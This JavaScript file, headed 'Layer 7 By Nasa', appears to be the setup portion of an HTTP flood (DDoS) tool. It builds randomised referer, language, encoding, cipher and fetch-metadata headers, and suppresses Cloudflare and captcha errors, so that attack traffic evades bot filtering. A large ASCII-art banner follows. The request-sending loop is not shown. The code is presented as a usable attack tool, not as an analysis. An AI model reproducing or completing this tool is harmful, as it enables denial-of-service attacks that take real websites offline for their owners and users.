/**
 *Layer 7 By Nasa
 * 
 */

 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const http = require('http');
 const fs = require("fs");
 const random_ua = require('random-ua');

const fetch_site = [
  "same-origin",
  "same-site",
  "cross-site",
  "none"
];

const type = [
  "text/plain",
  "text/html",
  "application/json",
  "application/xml",
  "multipart/form-data",
  "application/octet-stream",
  "image/jpeg",
  "image/png",
  "audio/mpeg",
  "video/mp4",
  "application/javascript",
  "application/pdf",
  "application/vnd.ms-excel",
  "application/vnd.ms-powerpoint",
  "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  "application/zip",
  "image/gif",
  "image/bmp",
  "image/tiff",
  "audio/wav",
  "audio/midi",
  "video/avi",
  "video/mpeg",
  "video/quicktime",
  "text/csv",
  "text/xml",
  "text/css",
  "text/javascript",
  "application/graphql",
  "application/x-www-form-urlencoded",
  "application/vnd.api+json",
  "application/ld+json",
  "application/x-pkcs12",
  "application/x-pkcs7-certificates",
  "application/x-pkcs7-certreqresp",
  "application/x-pem-file",
  "application/x-x509-ca-cert",
  "application/x-x509-user-cert",
  "application/x-x509-server-cert",
  "application/x-bzip",
  "application/x-gzip",
  "application/x-7z-compressed",
  "application/x-rar-compressed",
  "application/x-shockwave-flash"
];



const referer = [
  'https://www.google.com',
  'https://www.facebook.com',
  'https://www.twitter.com',
  'https://www.youtube.com',
  'https://www.amazon.com',
  'https://www.netflix.com',
  'https://www.instagram.com',
  'https://www.yahoo.com',
  'https://www.stackoverflow.com',
  'https://www.github.com',
  'https://www.linkedin.com',
  'https://www.cnn.com',
  'https://www.apple.com',
  'https://www.microsoft.com',
  'https://www.wikipedia.org',
  'https://www.nytimes.com',
  'https://www.msn.com',
  'https://www.reddit.com',
  'https://www.quora.com',
  'https://www.npr.org',
  'https://www.bbc.com',
  'https://www.theguardian.com',
  'https://www.huffingtonpost.com',
  'https://www.washingtonpost.com',
  'https://www.wsj.com',
  'https://www.bloomberg.com',
  'https://www.cnbc.com',
  'https://www.merriam-webster.com',
  'https://www.dictionary.com',
  'https://www.thedailybeast.com',
  'https://www.thedailyshow.com',
  'https://www.colbertnation.com',
  'https://www.nationalgeographic.com',
  'https://www.nasa.gov',
  'https://www.nypl.org',
  'https://www.britannica.com',
  'https://www.healthline.com',
  'https://www.webmd.com',
  'https://www.mayoclinic.org',
  'https://www.cdc.gov',
  'https://www.nih.gov',
  'https://www.medlineplus.gov',
  'https://www.cancer.gov',
  'https://www.fda.gov',
  'https://www.nature.com',
  'https://www.sciencemag.org',
  'https://www.scientificamerican.com',
  'https://www.who.int',
  'https://www.un.org',
  'https://www.worldbank.org',
  'https://www.imf.org',
  'https://www.wto.org',
  'https://www.oecd.org',
  'https://www.europa.eu',
  'https://www.nato.int',
  'https://www.icrc.org',
  'https://www.amnesty.org',
  'https://www.hrw.org',
  'https://www.greenpeace.org',
  'https://www.oxfam.org',
  'https://www.doctorswithoutborders.org',
  'https://www.unicef.org',
  'https://www.savethechildren.org',
  'https://www.redcross.org',
  'https://www.wikipedia.org',
  'https://www.wikimedia.org',
  'https://www.mozilla.org',
  'https://www.apache.org',
  'https://www.mysql.com',
  'https://www.php.net',
  'https://www.python.org',
  'https://www.ruby-lang.org',
  'https://www.jquery.com',
  'https://www.reactjs.org',
  'https://www.angularjs.org',
  'https://www.vuejs.org',
  'https://www.bootstrap.com',
  'https://www.materializecss.com',
  'https://www.sass-lang.com',
  'https://www.lesscss.org',
  'https://www.d3js.org',
  'https://www.highcharts.com',
  'https://www.chartjs.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.openstreetmap.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.chartjs.org',
  'https://www.highcharts.com',
  'https://www.d3js.org',
  'https://www.lesscss.org',
  'https://www.sass-lang.com',
  'https://www.materializecss.com',
  'https://www.bootstrap.com',
  'https://www.vuejs.org',
  'https://www.angularjs.org',
  'https://www.reactjs.org',
  'https://www.jquery.com',
  'https://www.ruby-lang.org',
  'https://www.python.org',
  'https://www.php.net',
  'https://www.mysql.com',
  'https://www.apache.org',
  'https://www.mozilla.org',
  'https://www.wikimedia.org',
  'https://www.wikipedia.org',
  'https://www.redcross.org',
  'https://www.savethechildren.org',
  'https://www.unicef.org',
  'https://www.doctorswithoutborders.org',
  'https://www.oxfam.org',
  'https://www.greenpeace.org',
  'https://www.hrw.org',
  'https://www.amnesty.org',
  'https://www.icrc.org',
  'https://www.nato.int',
  'https://www.europa.eu',
  'https://www.oecd.org',
  'https://www.wto.org',
  'https://www.imf.org',
  'https://www.worldbank.org',
  'https://www.un.org',
  'https://www.who.int',
  'https://www.scientificamerican.com',
  'https://www.sciencemag.org',
  'https://www.nature.com',
  'https://www.fda.gov',
  'https://www.cancer.gov',
  'https://www.medlineplus.gov',
  'https://www.nih.gov',
  'https://www.cdc.gov',
  'https://www.mayoclinic.org',
  'https://www.webmd.com',
  'https://www.healthline.com',
  'https://www.britannica.com',
  'https://www.nypl.org',
  'https://www.nasa.gov',
  'https://www.nationalgeographic.com',
  'https://www.colbertnation.com',
  'https://www.thedailyshow.com',
  'https://www.thedailybeast.com',
  'https://www.dictionary.com',
  'https://www.merriam-webster.com',
  'https://www.cnbc.com',
  'https://www.bloomberg.com',
  'https://www.wsj.com',
  'https://www.washingtonpost.com',
  'https://www.huffingtonpost.com',
  'https://www.theguardian.com',
  'https://www.bbc.com',
  'https://www.npr.org',
  'https://www.quora.com',
  'https://www.reddit.com',
  'https://www.msn.com',
  'https://www.nytimes.com',
  'https://www.wikipedia.org',
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.cnn.com',
  'https://www.linkedin.com',
  'https://www.github.com',
  'https://www.stackoverflow.com',
  'https://www.yahoo.com',
  'https://www.instagram.com',
  'https://www.netflix.com',
  'https://www.amazon.com',
  'https://www.youtube.com',
  'https://www.twitter.com',
  'https://www.facebook.com',
  'https://www.google.com'
];

const platform = [
  "Windows",
  "Windows Phone",
  "Macintosh",
  "Linux",
  "iOS",
  "Android",
  "PlayStation 4",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other"
];
 cplist = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
],
accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
],
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
],
encoding_header = [
    'gzip, deflate',
    'br;q=1.0, gzip;q=0.8, *;q=0.1',
    'gzip',
    'gzip, compress',
    'compress, deflate',
    'compress',
    'gzip, deflate, br',
    'deflate'
],
controle_header = [
    'max-age=604800',
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate'
],

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
 
const country = [
  "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
  "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
  "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
  "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
  "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
  "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
  "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
  "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
  "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
  "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
  "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
  "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
  "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
  "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
  "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
];
const fetch_mode = [
  "navigate",
  "same-origin",
  "no-cors",
  "cors",
];
const fetch_dest = [
  "document",
  "sharedworker",
  "subresource",
  "unknown",
  "worker",
];

 const headerFunc = {
  accept() {
    for (let i = accept_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [accept_header[i], accept_header[j]] = [accept_header[j], accept_header[i]];
    }
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  },
  lang() {
    for (let i = lang_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [lang_header[i], lang_header[j]] = [lang_header[j], lang_header[i]];
    }
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  },
  encoding() {
    for (let i = encoding_header.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [encoding_header[i], encoding_header[j]] = [encoding_header[j], encoding_header[i]];
    }
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
  },
  controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
  },
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
  referers() {
    for (let i = referer.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [referer[i], referer[j]] = [referer[j], referer[i]];
    }
    return referer[Math.floor(Math.random() * referer.length)]
  },
  platforms() {
    return platform[Math.floor(Math.random() * platform.length)]
  },
  mode() {
    return fetch_mode[Math.floor(Math.random() * fetch_mode.length)]
  },
  dest() {
    return fetch_dest[Math.floor(Math.random() * fetch_dest.length)]
  },
  site() {
    return fetch_site[Math.floor(Math.random() * fetch_site.length)]
  },
  countrys() {
    return country[Math.floor(Math.random() * country.length)]
  },
  type() {
    return type[Math.floor(Math.random() * type.length)]
  },
  
}
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

             console.log('\033[1;37m⡍⢈⠄⡀⠀⠠⠀⢀⡀⠀⠠⠀⠀⡀⠀⠠⠀⠀⡀⠀⠀⡀⠀⠀⣠⣶⠻⣍⡟⣜⢣⢎⣵⡟⢯⣹⢫⢝⡷⣇⡞⣱⢫⡝⣛⠻⣶⣤⡀⠀⠀⠀⢀⠀⠀⢀⠀⡀⠀⠄⢀⠀⡀⠠⠀⢀⠀⡀⠀⠄⠀⠀⡀⠠⠀⡄ ');;
             console.log('⠄⠢⠐⠄⠀⠐⠰⠀⠆⠀⠐⠢⠁⠆⠐⡀⠢⠁⠄⠀⡀⠄⣱⣾⠟⣩⠳⡜⡼⡌⣷⡻⣍⢞⡱⢎⡳⢎⣜⠻⢷⣡⠳⣜⡡⢏⡬⠻⣿⣦⡈⠐⠠⠀⢀⠰⠀⠒⠀⡀⠐⠂⠔⠀⢀⠢⠐⠄⠀⠂⠜⠀⠆⠐⠀⠆');
             console.log('⡠⠀⠀⠀⢂⠑⡀⠀⠠⡈⠄⡀⠀⢀⠂⠄⡀⠀⢈⠠⢀⡾⡯⣙⢎⡵⢫⡜⡱⡜⢥⠳⡜⢮⡱⢫⡜⣣⢮⡙⡖⣆⠯⡴⡙⣎⢖⡣⣜⠻⣿⣄⠀⢂⠄⠂⠀⠀⢂⡐⠀⠀⢀⠂⡄⠀⠀⢐⠠⣈⠀⠀⠐⢠⢈⠀');
             console.log('⠐⡈⢂⠀⠀⠐⡈⢀⠀⠀⠐⡈⠀⠀⠀⣀⣰⣤⣴⡟⢋⠴⣩⠎⡼⣑⢮⣱⣎⠧⡛⡜⡥⣋⠷⣸⠱⢎⡵⢚⡴⣿⣰⠹⣌⠶⡱⡌⣇⢻⡿⣷⣤⣀⣐⡀⠂⠀⠀⠈⡐⠀⠀⠀⡈⠄⠂⠀⠀⠠⢀⠁⠀⠀⠂');
             console.log('⠂⠄⠀⠁⡀⠂⠌⠀⠠⠀⣐⣤⣴⣶⣿⣿⣿⢿⣾⠏⡐⡘⢣⡕⡫⢖⣩⣾⣻⡑⣮⢱⡙⡴⣩⠚⣥⠛⡼⣘⢣⠞⡸⢿⣷⣌⡳⢥⠓⡜⢢⠿⡜⢿⣼⢿⣿⣷⣶⣦⣤⣀⠡⠐⡀⠄⠈⢁⠐⠠⠁⠀⠠⠒⠠⠁');
             console.log('⠊⢀⠠⠄⠀⠃⠠⠠⠐⠀⣿⣿⣿⣿⣿⣿⣧⣿⠏⢀⡿⢁⣼⡱⡹⢬⣿⠓⢦⠱⡟⢦⡹⢔⢣⢛⡤⡛⡴⢩⢎⠽⣑⠎⣏⢻⣷⣎⡓⣾⠙⢶⠻⡎⢿⣦⣿⣿⣿⣿⣿⣿⡇⠐⠀⠠⠀⠄⠈⠒⠀⡀⠄⠁⠒⠀');
             console.log('⡀⠠⠐⠄⠀⣀⠠⠡⠀⡀⠸⣿⣿⣿⣿⢋⣿⡏⠤⣿⢇⡛⢦⠓⣍⣾⠫⡔⣃⢻⡏⠧⣜⡩⢖⣣⠚⡥⣙⠦⣍⠚⣌⠞⣙⠦⡽⣶⣝⡸⢧⣈⡷⢿⡈⢿⣦⢻⣿⣿⣿⣿⠀⡀⢀⠡⠠⠁⢀⢀⠂⠄⠂⡀⢀⠁');
             console.log('⡠⠁⠀⢀⠂⡐⠀⠀⠀⠄⡁⢻⣿⣿⡿⣿⡟⡜⣱⡟⢬⡹⢌⠳⣼⠷⢣⠙⠤⢻⡏⡕⢢⡓⢬⢆⡭⢹⣦⠓⣌⠓⡼⣯⡜⡜⡰⢩⣿⡵⢪⡍⢦⡙⣯⢎⢿⣟⢻⣿⣿⠃⠀⡐⢂⠀⠀⠈⠄⡠⠀⠀⠐⠠⢈⠀');
             console.log('⠐⠈⠄⠀⠀⠐⠈⠐⠀⠀⠈⣿⣿⣿⡟⣌⠳⣼⡏⡖⢥⢋⣼⣏⠞⣠⣿⢌⣹⣧⢍⠣⡜⠢⢎⠰⣃⢿⣝⣨⠣⢔⠹⣷⡜⡥⢃⡜⢿⣇⠞⡤⢃⢿⣎⠚⣿⣿⣿⡟⢀⠂⠀⠀⠠⠁⠅⠀⠀⠂⠁⠂⠀⠀⠂');
             console.log('⠒⠈⠈⠀⠄⡘⠈⠈⠁⡐⢀⠂⠘⣿⣿⢱⢎⡱⣻⣑⢎⠳⢌⣿⡐⣚⢤⣿⢠⣿⢿⣨⠱⣬⢃⢬⠱⣐⢊⣿⣷⣉⢎⡱⢹⣿⣃⣧⠸⡌⢿⣱⢊⡝⣸⡧⢻⡽⣿⡿⠀⠀⠠⠐⢀⠂⠁⢐⠀⢂⠁⠈⢁⠐⢠⠁');
             console.log('⠈⠠⠐⠠⠐⠀⠡⢀⠐⠀⠂⢀⠠⢸⣏⡖⣾⡔⣿⢌⣎⢳⢸⡧⣱⣏⣾⣿⡂⣿⠘⣷⢂⡹⣧⢹⣎⠕⢦⡘⣿⢷⣦⡑⡃⢿⣻⣼⣧⠓⡼⣷⢩⡒⡭⣿⡹⣧⢻⣇⠀⠠⠀⠁⠂⡀⠄⡀⠈⠀⠄⡀⠄⠈⠀⡀');
             console.log('⡀⠠⠁⠁⠀⢠⠐⠠⢀⠀⣀⠠⢀⣿⡞⣰⡿⢏⣿⠲⣌⠆⣿⡅⣿⡾⣋⣬⣷⣿⣷⢼⣷⣐⢻⣧⣽⢾⡠⢓⠸⣧⣭⣿⣷⣾⣧⡙⢿⣯⠐⣿⡦⡝⡴⣿⠱⣿⣘⣿⣦⠑⢀⠀⡀⠄⠠⢁⠀⣀⠂⠄⢂⠀⣀⠁');
             console.log('⠄⠁⢀⠈⠐⠠⢀⠀⡀⠐⠀⢀⣾⡿⣜⡰⣿⢃⣿⠸⡜⣸⡿⢻⣿⣿⡿⢟⣟⣿⢿⣝⠺⠿⣎⣷⡈⠛⠿⠿⣦⣜⣯⣷⣿⣿⡿⢿⣷⣿⣏⣿⡗⢭⢒⣿⠱⣿⢰⠻⣿⢷⣄⠒⠀⢀⠀⠠⠀⠤⠀⠀⡀⠢⠠⠀');
             console.log('⠐⡈⠐⠀⠀⠨⢀⠡⠀⠀⣾⢿⣧⢍⡣⣿⡜⣹⡦⢓⣹⣧⢾⣿⠏⡁⠘⣿⣿⣎⢻⣦⠀⠙⠿⣧⠀⠄⡀⠉⣹⡟⠉⠛⣿⣷⣮⠻⣿⣿⡉⣷⢜⢎⣿⢆⣟⠺⣔⣻⡜⣿⣦⣀⠈⡐⠀⠀⠀⠂⠄⡁⠀⠀⡀');
             console.log('⠄⠂⠈⠁⡀⠂⠄⠂⠀⣀⣾⠟⣾⢹⢆⢧⣹⣖⢿⡇⢧⢸⣟⣿⠃⣸⣷⢰⣾⡞⣿⡆⠙⢀⠡⠀⠄⠀⠌⡀⠁⠛⢸⣇⣰⣾⣽⣿⡇⠙⣿⣻⣹⡎⣞⡿⣸⣏⡗⣮⢱⣿⡶⣱⣛⢷⣦⣄⡂⠄⠈⠀⢀⠀⣤⡀');
             console.log('⠈⠠⠀⠄⠀⠃⢀⠀⢠⣾⠯⣽⣿⡩⢞⡴⣩⢿⣌⣿⢢⢽⣾⡟⠀⢿⣿⢹⣿⣏⣿⡇⠐⡀⢂⠁⡈⠐⠠⢀⠁⠂⢸⣿⢿⣿⣟⣿⡟⠀⣻⣯⣽⡗⣼⡗⣿⢷⣙⢦⡏⢾⣯⡷⢭⣚⡴⣫⡝⣟⠷⡶⢶⢾⣻⡇');
             console.log('⢀⠈⠐⠈⠀⢀⠠⢨⣿⢣⣿⣿⡷⣙⢎⠶⣱⠺⣷⣿⡇⢺⡾⣷⠀⠘⣿⣯⡙⣵⡿⠁⠠⠐⡀⢂⠡⢈⠐⡈⠠⠁⠘⣿⣯⣋⣽⣿⠃⠀⣼⠷⠜⡧⣾⣱⣿⢪⡝⢶⡙⡯⡽⣿⣇⡞⡽⣷⣮⣍⣻⣜⣭⣾⠟⠀');
             console.log('⡀⠂⠀⠀⡁⠂⣰⣟⢮⣿⣿⣿⣷⢩⢎⣳⢂⢯⠹⣿⣿⡩⣿⠙⢧⡀⠈⠙⠛⠋⠁⢀⠂⠡⠀⠄⢲⠀⡡⢀⠁⠂⠄⠈⠛⠓⡛⠁⢀⡼⠛⠃⣼⣗⡿⣼⢧⠳⣞⣣⠟⣵⣹⣿⣿⣿⡜⡽⣟⠿⠿⠟⠋⢀⠠⠀');
             console.log('⠠⠁⠐⠀⣰⣟⣺⣿⣿⣿⣿⣿⣩⢾⡇⣏⣎⠳⡭⣿⣷⡸⣧⢀⡉⠛⡛⢀⢂⠐⠠⠈⠄⡁⠈⠄⢂⠐⠠⢈⡐⠈⠠⢀⡀⢛⠛⡛⣀⠣⢰⣿⡏⣷⡟⣮⢛⢶⡱⣛⠶⡥⣿⣿⣿⣿⡼⣹⣆⠠⠐⠀⠀⠀⡀');
             console.log('⡀⠁⠠⢰⡟⣼⣿⣿⣿⣿⣿⣿⣖⣺⣿⡲⡜⢧⠳⣜⢻⣷⠽⣧⡘⡐⢠⠡⠰⣮⣀⠡⠐⢀⠡⢈⠠⠈⠄⢂⠠⢀⣡⡤⢈⠤⠘⡐⢠⢢⣿⣽⣧⡿⣙⠶⣫⢎⡷⢭⣳⣹⣿⣿⣿⣿⣿⣇⣿⠀⠁⠐⠠⠐⠀');
             console.log('⠄⠀⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣧⣛⡭⣓⢮⡙⢾⣻⣽⣷⡔⢀⠂⠄⠠⠉⠛⡓⠶⠶⠤⠴⠦⠶⠖⠚⠋⢉⠀⠂⠌⡐⠐⣤⣿⣿⣿⡟⣵⢫⡽⣡⢟⡼⣣⢇⣿⣿⣿⣿⣿⣿⣿⣿⠀⡀⠌⠐⠈⠄');
             console.log('⠈⠄⠁⢺⣿⣿⣿⢹⣿⣿⣿⣿⣿⡏⣿⣿⣖⢧⡛⣼⡙⣎⢎⠯⣿⣿⣄⢂⠈⡀⠡⠐⠠⢀⠐⡈⠐⠠⠂⢉⠐⢈⠠⠈⠐⠠⣠⣾⣿⣿⣿⣿⡹⢖⣣⣝⢣⡟⣼⢣⣿⣿⣿⣿⣿⣿⣿⣿⡇⠐⠀⢂⠀⢀⠂');
